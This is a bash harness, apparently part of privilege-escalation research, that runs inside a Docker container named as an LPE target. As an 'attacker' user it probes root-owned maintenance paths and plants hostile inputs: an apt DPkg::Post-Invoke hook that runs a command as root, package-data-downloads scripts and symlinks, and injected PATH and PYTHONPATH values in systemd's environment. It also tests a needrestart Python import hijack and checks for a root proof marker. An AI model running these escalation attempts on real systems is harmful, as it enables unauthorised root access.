#!/usr/bin/env bash
set -u

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/agent_maint_glue_recheck.out"
tmp_log="$(mktemp "$repo_dir/logs/agent_maint_glue_recheck.out.tmp.XXXXXX")"

section() {
  printf '\n### %s\n' "$*"
}

finish() {
  mv "$tmp_log" "$log_path"
  printf '\nWrote %s\n' "$log_path"
}
trap finish EXIT

exec > >(tee "$tmp_log") 2>&1

section "host scope"
printf 'repo=%s\ncontainer=%s\n' "$repo_dir" "$container"
docker ps --filter "name=$container" --format 'container={{.Names}} image={{.Image}} status={{.Status}}'

docker exec -i "$container" bash <<'TARGET'
set +e

section() {
  printf '\n### %s\n' "$*"
}

cmd() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  "$@" 2>&1
  printf '[rc=%s]\n' "$?"
}

as_attacker() {
  printf '\n$ attacker: %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf '[attacker rc=%s]\n' "$?"
}

ROOT_MARKER=/root/agent_maint_glue_root_marker
NR_MARKER=/tmp/agent_maint_needrestart_import
rm -rf /home/attacker/agent_maint_glue /tmp/agent_maint_* "$ROOT_MARKER" 2>/dev/null

section "target baseline"
sed -n '1,12p' /etc/os-release
uname -a
cmd id attacker
cmd groups attacker
cmd systemctl is-system-running
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  apt cloud-init cron dpkg logrotate needrestart systemd unattended-upgrades \
  ubuntu-pro-client ubuntu-advantage-tools update-notifier-common \
  ubuntu-release-upgrader-core update-manager-core 2>/dev/null | sort

section "default maintenance timers and path units"
cmd systemctl list-timers --all --no-pager
cmd systemctl list-units --type=path --all --no-pager
for unit in \
  apt-daily.service apt-daily-upgrade.service dpkg-db-backup.service \
  logrotate.service man-db.service motd-news.service sysstat-collect.service \
  sysstat-summary.service systemd-tmpfiles-clean.service \
  update-notifier-download.service update-notifier-motd.service \
  ua-timer.service unattended-upgrades.service apport-autoreport.service \
  systemd-ask-password-wall.service; do
  echo "--- $unit"
  systemctl show "$unit" -p Id -p LoadState -p ActiveState -p UnitFileState \
    -p User -p ExecStart -p ConditionResult -p FragmentPath 2>&1
done
for unit in apport-autoreport.path systemd-ask-password-wall.path; do
  echo "--- $unit"
  systemctl cat "$unit" 2>&1
done

section "root-owned input and state paths"
paths='
/etc/apt/apt.conf.d
/etc/needrestart
/etc/needrestart/conf.d
/etc/cron.d
/etc/cron.daily
/etc/logrotate.d
/etc/tmpfiles.d
/usr/lib/tmpfiles.d
/usr/share/package-data-downloads
/var/lib/update-notifier
/var/lib/update-notifier/package-data-downloads
/var/lib/update-notifier/package-data-downloads/partial
/var/lib/ubuntu-advantage
/var/lib/ubuntu-release-upgrader
/var/lib/update-manager
/var/lib/apt
/var/lib/apt/lists/partial
/var/cache/apt
/var/cache/apt/archives/partial
/var/log/apt
/var/log/unattended-upgrades
/var/lib/dpkg
/var/backups
/run/systemd/ask-password
/var/lib/apport
/var/spool/cron/crontabs
/var/log
/var/log/sysstat
/var/cache/man
/run/needrestart
/run
/tmp
/var/tmp
/run/screen
'
for p in $paths; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %U:%G %n type=%F' "$p" 2>&1
  else
    echo "MISSING $p"
  fi
done

section "attacker write gates"
for p in $paths; do
  as_attacker "p='$p'; if [ -d \"\$p\" ]; then touch \"\$p/agent_maint_write_test\" && rm -f \"\$p/agent_maint_write_test\" && echo WRITABLE:\$p || echo NO_WRITE:\$p; else echo MISSING_OR_NOT_DIR:\$p; fi"
done
as_attacker "printf 'DPkg::Post-Invoke {\"/bin/sh -c \\\"id > $ROOT_MARKER\\\"\";};\n' >/etc/apt/apt.conf.d/99agent-maint"
as_attacker "printf 'Script: /home/attacker/agent_maint_glue/hit.sh\n' >/usr/share/package-data-downloads/agent-maint"
as_attacker "ln -s $ROOT_MARKER /var/lib/update-notifier/package-data-downloads/agent-maint"
as_attacker "mkdir -p /run/needrestart && touch /run/needrestart/unpacked"
as_attacker "touch /run/systemd/ask-password/agent-maint"
as_attacker "mkdir -p /var/lib/apport/autoreport"

section "cron and anacron defaults"
cmd command -v anacron
cmd systemctl cat cron.service
cmd nl -ba /etc/crontab
cmd find /etc/cron.d /etc/cron.daily /etc/cron.weekly -maxdepth 1 -printf '%M %u:%g %p -> %l\n'
for f in /etc/cron.daily/* /etc/cron.weekly/*; do
  [ -f "$f" ] || continue
  echo "--- $f"
  grep -nE 'run/systemd|run-parts|PATH|systemctl|apt|logrotate|mandb|dpkg|sysstat|apport' "$f" 2>/dev/null || true
done
as_attacker "systemctl start cron.service"

section "needrestart patched interpreter regression"
BASE=/home/attacker/agent_maint_glue/needrestart
install -d -o attacker -g attacker "$BASE/py"
cat >"$BASE/py/agentmod.py" <<'PY'
import os
with open("/tmp/agent_maint_needrestart_import", "a") as f:
    f.write("agentmod uid=%s euid=%s\n" % (os.getuid(), os.geteuid()))
PY
cat >"$BASE/py/sleeper.py" <<'PY'
import agentmod
import time
time.sleep(240)
PY
chown -R attacker:attacker "$BASE"
as_attacker "PYTHONPATH='$BASE/py' /usr/bin/python3 '$BASE/py/sleeper.py' >/tmp/agent_maint_nr_user.out 2>&1 & echo \$! >'$BASE/py.pid'"
sleep 1
echo "marker after attacker-owned start:"
cat "$NR_MARKER" 2>/dev/null || echo "absent"
rm -f "$NR_MARKER"
cmd /usr/sbin/needrestart -v -b -r l
echo "marker after root needrestart:"
if [ -e "$NR_MARKER" ]; then
  cat "$NR_MARKER"
else
  echo "absent"
fi
grep -E 'NeedRestart::Interp::Python|agent_maint|source=' /tmp/needrestart.* /tmp/agent_maint_nr_user.out 2>/dev/null || true
if [ -f "$BASE/py.pid" ]; then
  kill "$(cat "$BASE/py.pid")" 2>/dev/null || true
fi
pkill -u attacker -f agent_maint_glue/needrestart 2>/dev/null || true

section "apt, unattended-upgrades, update-notifier, ubuntu-pro triggers"
cmd apt-config dump
as_attacker "systemctl set-environment PATH=/home/attacker/agent_maint_glue/bin:/usr/bin:/bin"
as_attacker "systemctl import-environment PATH PYTHONPATH PERL5LIB"
for unit in apt-daily.service apt-daily-upgrade.service update-notifier-download.service update-notifier-motd.service ua-timer.service; do
  as_attacker "systemctl start $unit"
done
as_attacker "printf '%s\n' \$\$ >/var/run/unattended-upgrades.pid"
as_attacker "printf '100\n' >/var/run/unattended-upgrades.progress"
uupid="$(pgrep -f 'unattended-upgrade-shutdown' | head -1)"
if [ -n "$uupid" ]; then
  as_attacker "kill -TERM $uupid"
fi
for unit in update-notifier-download.service update-notifier-motd.service ua-timer.service apt-daily.service apt-daily-upgrade.service; do
  echo "--- root smoke $unit"
  timeout 45 systemctl start "$unit" 2>&1
  echo "[rc=$?]"
done

section "logrotate non-rsyslog inputs"
cmd logrotate --version
cmd find /etc/logrotate.d -maxdepth 1 -type f -printf '%M %u:%g %p\n'
grep -RnsE '(^|[[:space:]])(su|create|postrotate|prerotate|sharedscripts|include|compress|olddir|mail)[[:space:]]' /etc/logrotate.conf /etc/logrotate.d 2>/dev/null || true
for p in /var/log/dpkg.log /var/log/apt/history.log /var/log/apt/term.log \
  /var/log/unattended-upgrades/unattended-upgrades.log /var/log/wtmp \
  /var/log/btmp /var/log/sysstat/sa17; do
  as_attacker "printf agent_maint >>'$p'"
done
cmd logrotate -d /etc/logrotate.conf

section "maintainer script glue scan"
for pkg in apt dpkg needrestart unattended-upgrades update-notifier-common ubuntu-pro-client cloud-init cron logrotate; do
  for f in /var/lib/dpkg/info/"$pkg".{preinst,postinst,prerm,postrm,triggers}; do
    [ -e "$f" ] || continue
    echo "--- $f"
    stat -Lc '%A %U:%G %n' "$f"
    grep -nE 'dpkg-trigger|invoke-rc.d|systemctl|deb-systemd|tmpfiles|needrestart|unattended|logrotate|cron|run-parts|apt.systemd.daily|update-motd|package-data|ua|pro' "$f" 2>/dev/null || true
  done
done

section "root proof and cleanup"
if [ -e "$ROOT_MARKER" ]; then
  echo "ROOT_PROOF=YES"
  ls -l "$ROOT_MARKER"
  cat "$ROOT_MARKER"
else
  echo "ROOT_PROOF=NO"
fi
if [ -e "$NR_MARKER" ]; then
  echo "NEEDRESTART_MARKER_AFTER_ROOT=YES"
  cat "$NR_MARKER"
else
  echo "NEEDRESTART_MARKER_AFTER_ROOT=NO"
fi
rm -rf /home/attacker/agent_maint_glue /tmp/agent_maint_* "$ROOT_MARKER" 2>/dev/null
systemctl reset-failed apt-daily.service apt-daily-upgrade.service update-notifier-download.service update-notifier-motd.service ua-timer.service logrotate.service 2>/dev/null || true
echo "cleanup_done"
TARGET
